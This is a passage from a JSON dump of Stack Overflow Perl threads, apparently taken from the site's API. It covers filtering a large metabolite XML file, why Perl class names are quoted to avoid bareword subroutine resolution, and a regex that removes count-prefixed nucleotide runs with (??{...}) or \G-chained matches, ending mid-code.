"https://lh4.googleusercontent.com/-FrUR9oR7La0/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdNF1ly4lY2uNg7ETyTH6rwvkw_zg/photo.jpg?sz=128", "display_name": "PCs", "link": "https://stackoverflow.com/users/11786915/pcs"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 64, "favorite_count": 0, "accepted_answer_id": 59043987, "answer_count": 2, "score": 0, "last_activity_date": 1574753551, "creation_date": 1574742411, "last_edit_date": 1574749655, "question_id": 59043751, "link": "https://stackoverflow.com/questions/59043751/how-to-use-perl-to-filter-xml-file-with-tags", "title": "How to use perl to filter XML file with tags?", "body": "<p>I have a big XML file (2 GB) and that file contains too many useless data that need to be filtered, below is the rough structure of the XML file:</p>\n\n<p>(All the useless data are replaced by \"useless_information\" to make it looks clean and tidy)</p>\n\n<pre><code>&lt;hmdb&gt;\n    &lt;metabolite&gt;\n        &lt;useless_information&gt;&lt;/useless_information&gt;\n        &lt;useless_information&gt;&lt;/useless_information&gt;\n        &lt;useless_information&gt;&lt;/useless_information&gt;\n        &lt;useless_information&gt;&lt;/useless_information&gt;\n        ...\n        &lt;normal_concentrations&gt;\n            &lt;useless_information&gt;&lt;/useless_information&gt;\n            &lt;useless_information&gt;&lt;/useless_information&gt;\n            &lt;useless_information&gt;&lt;/useless_information&gt;\n            ...\n            &lt;concentration&gt;\n                &lt;useless_information&gt;&lt;/useless_information&gt;\n                &lt;useless_information&gt;&lt;/useless_information&gt;\n                &lt;useless_information&gt;&lt;/useless_information&gt;\n                &lt;useless_information&gt;&lt;/useless_information&gt;\n                ...\n                &lt;concentration_value&gt; 100 &lt;/concentration_value&gt;\n                &lt;subject_age&gt; 21 &lt;/subject_age&gt;\n                &lt;subject_sex&gt; male &lt;/subject_sex&gt;\n            &lt;/concentration&gt;\n            &lt;concentration&gt;&lt;/concentration&gt;\n            &lt;concentration&gt;&lt;/concentration&gt;\n            &lt;concentration&gt;&lt;/concentration&gt;\n            ...\n        &lt;/normal_concentrations&gt;\n    &lt;/metabolite&gt;\n    &lt;metabolite&gt;&lt;/metabolite&gt;\n    &lt;metabolite&gt;&lt;/metabolite&gt;\n    &lt;metabolite&gt;&lt;/metabolite&gt;\n    &lt;metabolite&gt;&lt;/metabolite&gt;\n    ...\n&lt;/hmdb&gt;\n</code></pre>\n\n<p>So, basically I would like to keep the following tags and values: concentration_value, subject_age and subject_sex, the rest are all not important and can be filtered, the XML should look like this after filter it:</p>\n\n<pre><code>&lt;hmdb&gt;\n    &lt;metabolite&gt;\n        &lt;concentration&gt;\n            &lt;concentration_value&gt; 100 &lt;/concentration_value&gt;\n            &lt;subject_age&gt; 21 &lt;/subject_age&gt;\n            &lt;subject_sex&gt; male &lt;/subject_sex&gt;\n        &lt;/concentration&gt;\n        &lt;concentration&gt;&lt;/concentration&gt;\n        &lt;concentration&gt;&lt;/concentration&gt;\n        &lt;concentration&gt;&lt;/concentration&gt;\n        ...\n    &lt;/metabolite&gt;\n    &lt;metabolite&gt;&lt;/metabolite&gt;\n    &lt;metabolite&gt;&lt;/metabolite&gt;\n    &lt;metabolite&gt;&lt;/metabolite&gt;\n    &lt;metabolite&gt;&lt;/metabolite&gt;\n    ...\n&lt;/hmdb&gt;\n</code></pre>\n\n<p>I need the data in this file to continue my study (This file is too big, my laptop cannot open this file, so I have to filter out the useless data to decrease the size of the XML file before I use it), but I don't know how to write perl script, I'm really appreciate your help, thank you so much :)</p>\n"}, {"tags": ["perl", "coding-style", "classname", "bareword"], "answers": [{"comments": [{"owner": {"reputation": 63855, "user_id": 124486, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/605442f85418d858e2ce1e1aea2092bb?s=128&d=identicon&r=PG", "display_name": "Evan Carroll", "link": "https://stackoverflow.com/users/124486/evan-carroll"}, "reply_to_user": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 0, "creation_date": 1574734669, "post_id": 59042701, "comment_id": 104327643, "body": "@mob yea, the Perl book mentions that too (explicitly), not sure if I should put that there or not? lol."}, {"owner": {"reputation": 63855, "user_id": 124486, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/605442f85418d858e2ce1e1aea2092bb?s=128&d=identicon&r=PG", "display_name": "Evan Carroll", "link": "https://stackoverflow.com/users/124486/evan-carroll"}, "reply_to_user": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 0, "creation_date": 1574734767, "post_id": 59042701, "comment_id": 104327670, "body": "@mob I added that too, as a footnote. Though I&#39;m not sure I like it."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1574739378, "post_id": 59042701, "comment_id": 104328629, "body": "<code>Foo::</code> has the advantage that it warns if <code>Foo</code> isn&#39;t an existing package"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574741298, "post_id": 59042701, "comment_id": 104329081, "body": "Related: <a href=\"https://stackoverflow.com/q/58263206/589924\">How does Perl parse unquoted bare words?</a>"}, {"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 1, "creation_date": 1574741453, "post_id": 59042701, "comment_id": 104329133, "body": "Try::Tiny is a better example than Foo.  In your code using <code>Foo-&gt;</code> you can be expected to know that there is no such subroutine in your package.  But if you are using Try::Tiny and a number of other cpan/other externally sourced modules, who&#39;s to say if one of them is using a Try package, and if so, if there is a Tiny sub in it?"}, {"owner": {"reputation": 63855, "user_id": 124486, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/605442f85418d858e2ce1e1aea2092bb?s=128&d=identicon&r=PG", "display_name": "Evan Carroll", "link": "https://stackoverflow.com/users/124486/evan-carroll"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574746400, "post_id": 59042701, "comment_id": 104330395, "body": "@ikegami <code>Foo::-&gt;new</code> and <code>&quot;Foo&quot;-&gt;new</code> both seem to warn, for me. Can you produce an example where only one warns?"}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1574750873, "post_id": 59042701, "comment_id": 104331795, "body": "Also of note, the second &quot;requirement&quot; in that paragraph from PP applies specifically to indirect object notation since the method name comes first, it isn&#39;t ambiguous in normal method invocation to have a <code>sub new</code> symbol defined."}, {"owner": {"reputation": 3472, "user_id": 4990392, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/89acc35f0339a9c7e6ae36443a23e2d9?s=128&d=identicon&r=PG&f=1", "display_name": "Dada", "link": "https://stackoverflow.com/users/4990392/dada"}, "edited": false, "score": 0, "creation_date": 1574757675, "post_id": 59042701, "comment_id": 104334614, "body": "@EvanCarroll <code>Foo::-&gt;new</code> warns at compile time (and dies at run time), while <code>&quot;Foo&quot;-&gt;new</code> only dies at run time (if you use <code>warnings &#39;FATAL&#39; =&gt; &#39;all&#39;</code>, then it matters for instance). As for an example: <code>perl -wcE &#39;&quot;Foo&quot;-&gt;new&#39;</code> doesn&#39;t warn, but <code>perl -wcE &#39;Foo::-&gt;new&#39;</code> does."}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1574779873, "post_id": 59042701, "comment_id": 104346843, "body": "Note that neither quoting nor Paamayim-Nekudotayim-ing the class name can save you from someone doing <code>open *FOO</code>, see <a href=\"https://stackoverflow.com/q/23312167/1030675\">stackoverflow.com/q/23312167/1030675</a>."}], "tags": [], "owner": {"reputation": 63855, "user_id": 124486, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/605442f85418d858e2ce1e1aea2092bb?s=128&d=identicon&r=PG", "display_name": "Evan Carroll", "link": "https://stackoverflow.com/users/124486/evan-carroll"}, "is_accepted": true, "score": 8, "last_activity_date": 1574734634, "last_edit_date": 1592644375, "creation_date": 1574734160, "answer_id": 59042701, "question_id": 59042700, "link": "https://stackoverflow.com/questions/59042700/why-do-some-users-quote-classnames-in-perl/59042701#59042701", "title": "Why do some users quote classnames in Perl?", "body": "<p>Take a simpler example</p>\n<pre><code>package Foo { sub new { die 7  } };\npackage Bar { sub new { die 42 } };\nsub Foo { &quot;Bar&quot; }\nFoo-&gt;new();\n</code></pre>\n<p>In the above example, the constant <code>Foo</code> resolves to &quot;Bar&quot;, so so this calls <code>&quot;Bar&quot;-&gt;new</code> not <code>&quot;Foo&quot;-&gt;new</code>. How do you stop the subroutine from resolving? You can quote it.</p>\n<pre><code>&quot;Foo&quot;-&gt;new();\n</code></pre>\n<p>As for the performance implication, things are not made worse by using a string rather than a bareword. I've confirmed the optree generated by <code>O=Deparse</code> is the same. So as a general rule, it seems it's better to quote the Classnames if you value correctness.</p>\n<p>This is mentioned in Programming Perl, (sadly in the context of <em>indirect method invocation</em>)</p>\n<blockquote>\n<p>... so we'll tell you that you can almost always get away with a bare class name, provided two things are true. First, there is no subroutine of the same name as the class. (If you follow the convention that <strong>subroutine names like <code>new</code> start lowercase and class names like <code>ElvenRing</code> start uppercase</strong>, this is never a problem). Second, the class been loaded with one of</p>\n<pre><code>use ElvenRing;\nrequire ElvenRing;\n</code></pre>\n<p>Either of these declarations ensures that Perl knows <code>ElvenRing</code> is a module name, which forces any bare name like <code>new</code> before the class name <code>ElvenRing</code> to be interpreted as a method call, even if you happen to have declare a <code>new</code> subroutine of your own in the current package.</p>\n</blockquote>\n<p>And, that makes sense: the confusion here can only happen if your subroutines (typically lowercase) have the same name as a class (typically uppercase). This can only happen if you violate that naming convention above.</p>\n<p>tldr; it is probably a good idea to quote your classnames, if you know them and you value correctness over clutter.</p>\n<p>Side note: alternatively you can stop resolution of a bareword to a function by affixing a <code>::</code> to the end of it, for example in the above <code>Foo::-&gt;new</code>.</p>\n<hr />\n<p><em>Thanks to <a href=\"https://www.reddit.com/r/perl/comments/e1hdy4/feedback_sought_typetiny_toby_inkster_blogsperlorg/f8qdc1r/\" rel=\"noreferrer\">Ginnz on reddit for pointing this out to me</a>, and to <a href=\"https://www.reddit.com/r/perl/comments/e1hdy4/feedback_sought_typetiny_toby_inkster_blogsperlorg/f8qdc1r/\" rel=\"noreferrer\">Toby Inkster for the comment (though it didn't make sense to me on first read).</a></em></p>\n"}, {"tags": [], "owner": {"reputation": 120535, "user_id": 123109, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/157c96de3d125abc1c363ff25c20dfaf?s=128&d=identicon&r=PG", "display_name": "Greg Bacon", "link": "https://stackoverflow.com/users/123109/greg-bacon"}, "is_accepted": false, "score": 0, "last_activity_date": 1574895267, "creation_date": 1574895267, "answer_id": 59079503, "question_id": 59042700, "link": "https://stackoverflow.com/questions/59042700/why-do-some-users-quote-classnames-in-perl/59079503#59079503", "title": "Why do some users quote classnames in Perl?", "body": "<p>Explicitly quoting the class name rather than using a bareword (which is treated as a string) is one of three ways to avoid syntactic ambiguity. The <a href=\"https://perldoc.perl.org/perlobj.html#Invoking-Class-Methods\" rel=\"nofollow noreferrer\">Invoking Class Methods</a> section of the <a href=\"https://perldoc.perl.org/perlobj.html\" rel=\"nofollow noreferrer\">perlobj documentation</a> explains.</p>\n\n<blockquote>\n  <p>Because Perl allows you to use barewords for package names and\n  subroutine names, it sometimes interprets a bareword\u2019s meaning\n  incorrectly. For example, the construct <code>Class-&gt;new()</code> can be\n  interpreted as either <code>'Class'-&gt;new()</code> or <code>Class()-&gt;new()</code> .In English,\n  that second interpretation reads as \u201ccall a subroutine named <code>Class()</code>,\n  then call <code>new()</code> as a method on the return value of <code>Class()</code>.\u201d If there\n  is a subroutine named <code>Class()</code> in the current namespace, Perl will\n  always interpret <code>Class-&gt;new()</code> as the second alternative: a call to\n  <code>new()</code> on the object returned by a call to <code>Class()</code>.</p>\n</blockquote>\n\n<p>See this odd case in action with the demo below.</p>\n\n<pre><code>#! /usr/bin/env perl\n\nuse strict;\nuse warnings;\n\nsub Type::Tiny { print \"Returning Bogus\\n\" ; return \"Bogus\" }\n\nsub Type::Tiny::new { print \"Type::Tiny::new\\n\" }\n\nsub Bogus::new { print \"Bogus::new\\n\" }\n\nmy $class = \"Type::Tiny\";\n\nType::Tiny-&gt;new;\nType::Tiny::-&gt;new;\n\"Type::Tiny\"-&gt;new;\n$class-&gt;new;\n</code></pre>\n\n<p>Its output is</p>\n\n<pre>Returning Bogus\nBogus::new\nType::Tiny::new\nType::Tiny::new\nType::Tiny::new</pre>\n\n<p>The rest of the aforementioned documentation section shows how to protect against surprising behavior or inadvertent errors.</p>\n\n<blockquote>\n  <p>You can force Perl to use the first interpretation (<em>i.e.</em>, as a\n  method call on the class named <code>\"Class\"</code>) in two ways. First, you can\n  append a <code>::</code> to the class name:</p>\n\n<pre><code>Class::-&gt;new()\n</code></pre>\n  \n  <p>Perl will always interpret this as a method call.</p>\n  \n  <p>Alternatively, you can quote the class name:</p>\n\n<pre><code>'Class'-&gt;new()\n</code></pre>\n  \n  <p>Of course, if the class name is in a scalar Perl will do the right\n  thing as well:</p>\n\n<pre><code>my $class = 'Class';\n$class-&gt;new();\n</code></pre>\n</blockquote>\n\n<p>Applying to your question, all of the calls below are equivalent.</p>\n\n<pre><code>Type::Tiny::-&gt;new( \u2026 );\n\n\"Type::Tiny\"-&gt;new( \u2026 );\n\nmy $class = \"Type::Tiny\";\n$class-&gt;new( \u2026 );\n</code></pre>\n\n<p>Appending <code>::</code> to the end has the advantage of producing a helpful warning. Say you accidentally typed</p>\n\n<pre><code>Type::Tinny::-&gt;new;\n</code></pre>\n\n<p>That produces</p>\n\n<pre>Bareword \"Type::Tinny::\" refers to nonexistent package at ./try line 15.\nCan't locate object method \"new\" via package \"Type::Tinny\" (perhaps you forgot to load \"Type::Tinny\"?) at ./try line 15.</pre>\n"}], "owner": {"reputation": 63855, "user_id": 124486, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/605442f85418d858e2ce1e1aea2092bb?s=128&d=identicon&r=PG", "display_name": "Evan Carroll", "link": "https://stackoverflow.com/users/124486/evan-carroll"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 588, "favorite_count": 1, "accepted_answer_id": 59042701, "answer_count": 2, "score": 12, "last_activity_date": 1574895267, "creation_date": 1574734160, "last_edit_date": 1574746543, "question_id": 59042700, "link": "https://stackoverflow.com/questions/59042700/why-do-some-users-quote-classnames-in-perl", "title": "Why do some users quote classnames in Perl?", "body": "<p>Looking at <a href=\"https://metacpan.org/pod/Type::Tiny\" rel=\"noreferrer\"><code>Type::Tiny</code></a>, I see that the class name in the call to <code>Type::Tiny-&gt;new</code> is quoted in the official docs,</p>\n\n<pre><code>my $NUM = \"Type::Tiny\"-&gt;new(\n   name       =&gt; \"Number\",\n   constraint =&gt; sub { looks_like_number($_) },\n   message    =&gt; sub { \"$_ ain't a number\" },\n);\n</code></pre>\n\n<p>Why is this? Is this mere style? Is there any performance ramifications for this practice?</p>\n"}, {"tags": ["regex", "perl", "backreference"], "answers": [{"comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1574721510, "post_id": 59040214, "comment_id": 104324656, "body": "I think you should mention good-practice-standing of constructs like <code>??{..}</code>"}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1574721987, "post_id": 59040214, "comment_id": 104324798, "body": "I don&#39;t think there&#39;s anything wrong with the usage here. The only thing to mention would be that it would not be the most performant solution, but I am not sure any other solution would do better, depending on the requirements."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1574722045, "post_id": 59040214, "comment_id": 104324810, "body": "See <a href=\"https://stackoverflow.com/a/47866787/4653379\">this post</a> for instance (and another above it, commenting on it). It&#39;s not &quot;wrong&quot; it&#39;s just tricky and error-prone.  And some uses are disallowed. Etc."}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1574722180, "post_id": 59040214, "comment_id": 104324843, "body": "I agree it&#39;s not ideal to have to resort to subexpressions, but depending on the requirements, the tradeoff is worth it in this case IMO."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1574722412, "post_id": 59040214, "comment_id": 104324913, "body": "Of course, it&#39;s a trade-off (there&#39;s always some of that!), all I am saying is that I think it should be mentioned in the answer."}, {"owner": {"reputation": 23, "user_id": 12432157, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/efef733f8cee2212aeabc4dba7357cda?s=128&d=identicon&r=PG&f=1", "display_name": "berutti", "link": "https://stackoverflow.com/users/12432157/berutti"}, "edited": false, "score": 0, "creation_date": 1574761191, "post_id": 59040214, "comment_id": 104336432, "body": "First of all thank you! I think this is the solution I need. Efficiency is at this point not extremely important. Should it become I think then it&#39;s worth to dig into the source code of the software producing the output (even if that wouldn&#39;t be appreciated to change a very standard software in a production environment, that&#39;s why I wanted to avoid it)  I&#39;m realising I have a lot to learn about perl regex still! Is there any ambiguity or problem using such a subexpression here (aside from performance)?"}, {"owner": {"reputation": 23, "user_id": 12432157, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/efef733f8cee2212aeabc4dba7357cda?s=128&d=identicon&r=PG&f=1", "display_name": "berutti", "link": "https://stackoverflow.com/users/12432157/berutti"}, "edited": false, "score": 0, "creation_date": 1574761782, "post_id": 59040214, "comment_id": 104336807, "body": "Forget the question, I followed the link and found the WARNING message quite useful, so the functionality of this syntax might not survive an update of perl :)"}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "reply_to_user": {"reputation": 23, "user_id": 12432157, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/efef733f8cee2212aeabc4dba7357cda?s=128&d=identicon&r=PG&f=1", "display_name": "berutti", "link": "https://stackoverflow.com/users/12432157/berutti"}, "edited": false, "score": 0, "creation_date": 1574779062, "post_id": 59040214, "comment_id": 104346358, "body": "@berutti No, the functionality is guaranteed. What might change is the performance optimizations."}], "tags": [], "owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "is_accepted": true, "score": 3, "last_activity_date": 1574722858, "last_edit_date": 1574722858, "creation_date": 1574716534, "answer_id": 59040214, "question_id": 59039993, "link": "https://stackoverflow.com/questions/59039993/perl-match-with-regex-a-number-and-as-many-following-characters-as-the-number-sp/59040214#59040214", "title": "Perl match with regex a number and as many following characters as the number specifies within a string", "body": "<p>The <code>{$N}</code> component of the regex is a modifier, which can't use a backreference as its count. You could work around it with an embedded perl expression:</p>\n\n<pre><code>use strict;\nuse warnings;\nmy $string = 'ac.,.+2caaa..a.c';\n$string =~ s/[+-]([0-9]+)(??{ \"[ACGTacgt]{$1}\" })//g;\nprint \"$string\\n\";\n</code></pre>\n\n<p>Note that <a href=\"https://perldoc.pl/perlre#(??%7B-code-%7D)\" rel=\"nofollow noreferrer\">embedded subexpressions</a> are a last resort, and for obvious reasons prevent the regex from being optimized properly - it is IMO an appropriate tradeoff for this exact case where the matched substring must be removed, but if your requirements are slightly different, a split-out iterative approach may be more appropriate.</p>\n"}, {"comments": [{"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1574719620, "post_id": 59040577, "comment_id": 104324061, "body": "I tried to write a solution along these lines but it becomes extremely complicated if removing the string is a requirement as in the OP. You should also check whether the second regex succeeds, in case there are instances that don&#39;t have sufficient following letters."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1574721553, "post_id": 59040577, "comment_id": 104324665, "body": "@Grinnz Well, yeah, good points but we omitted all error checking (your solution as well).  I&#39;d expect them to add that.  Here at least it&#39;s easy to add any and all checks."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1574721760, "post_id": 59040577, "comment_id": 104324721, "body": "@Grinnz &quot;<i>removing the string is a requirement</i>&quot;  --  I didn&#39;t see it that way, on the contrary, I think they need to extract the pattern (and never mind the original string).  It says (my emphasis) &quot;<i><b>to test</b> if the regex work I&#39;m just playing with a substitution...</i>&quot; ..."}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1574721911, "post_id": 59040577, "comment_id": 104324777, "body": "The original code does not extract the string - the exact requirement is unclear, hence why I said &quot;if&quot; it&#39;s a requirement."}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1574722042, "post_id": 59040577, "comment_id": 104324808, "body": "There is no error checking required in my solution, as any parts of the string that do not match the whole expression will not be affected."}, {"owner": {"reputation": 23, "user_id": 12432157, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/efef733f8cee2212aeabc4dba7357cda?s=128&d=identicon&r=PG&f=1", "display_name": "berutti", "link": "https://stackoverflow.com/users/12432157/berutti"}, "edited": false, "score": 0, "creation_date": 1574761469, "post_id": 59040577, "comment_id": 104336593, "body": "Sorry actually I think I should have been clearer here, In principle it&#39;s also helpful, but the above solution serves better.  So the full requirement would be to extract the matches, but also get the string cleaned by the matches, because they have to go thru two different processings!  I think the representation of the string (which are genomic variants at a position) is not the most efficient ever... but I can&#39;t change it"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 23, "user_id": 12432157, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/efef733f8cee2212aeabc4dba7357cda?s=128&d=identicon&r=PG&f=1", "display_name": "berutti", "link": "https://stackoverflow.com/users/12432157/berutti"}, "edited": false, "score": 0, "creation_date": 1574799520, "post_id": 59040577, "comment_id": 104356916, "body": "@berutti Alright.  For your information, i&#39;ve added code to remove matches from the original string."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 2, "last_activity_date": 1575361623, "last_edit_date": 1575361623, "creation_date": 1574718408, "answer_id": 59040577, "question_id": 59039993, "link": "https://stackoverflow.com/questions/59039993/perl-match-with-regex-a-number-and-as-many-following-characters-as-the-number-sp/59040577#59040577", "title": "Perl match with regex a number and as many following characters as the number specifies within a string", "body": "<p>Can iterate over numbers and in the loop body match captured-number of letters that follow</p>\n\n<pre><code>use warnings;\nuse strict;\nuse feature 'say';\n\nmy $s = q(ac.,.+2caaa..a.c-3acgg+1tt);\n\nwhile ($s =~ /[+-]([0-9]+)/g) { \n    my $c = $1; \n    $s =~ /\\G([acgt]{$c})/i or next;\n\n    say \"$c$1\";  # or process it further / store it ...\n}\n</code></pre>\n\n<p>The <code>\\G</code> assertion makes its regex start from where the previous <code>m//g</code> match ended, as needed.  This is a standard approach to \"<em>chain global matches</em>\" and generally scan text by coordinating multiple regex. See docs for it in <a href=\"https://perldoc.perl.org/perlre.html#Regular-Expressions\" rel=\"nofollow noreferrer\">Assertions in perlre</a> and, for far more detail, <a href=\"https://perldoc.perl.org/perlop.html#Regexp-Quote-Like-Operators\" rel=\"nofollow noreferrer\">in perlop</a> (search for <code>\\G</code>).</p>\n\n<p>Prints</p>\n\n<pre>\n2ca\n3acg\n1t\n</pre>\n\n<p>If the <code>[+-]</code> need be extracted as well, add capturing parens around it and renumerate captures (that'll be <code>$1</code> and the number in <code>$2</code>)</p>\n\n<p>Please clarify other requirements -- for instance: Do you only need to extract the patterns or should anything in particular happen with the original string as well? </p>\n\n<hr>\n\n<p><strong>Update</strong>&nbsp; It's clarified that the matches also need be removed from the string.  </p>\n\n<p>An easy way is to simply remove them with another regex, after they have been collected.</p>\n\n<p>After the same processing as above, the collected matches are used to form a pattern with alternation for their removal. This is also efficient since by construction the subpatterns in the alternation come in the order of their appearance in the string</p>\n\n<pre><code>use warnings;\nuse strict;\nuse feature 'say';\n\nmy $string = q(ac.,.+2caaa..a.c-3acgg+1tt);\n\nmy @matches;\n\nwhile ($string =~ /([+-])([0-9]+)/g) { \n    my ($sign, $count)  = ($1, $2);\n    $string =~ /\\G([acgt]{$count})/i or next;    \n    push @matches, 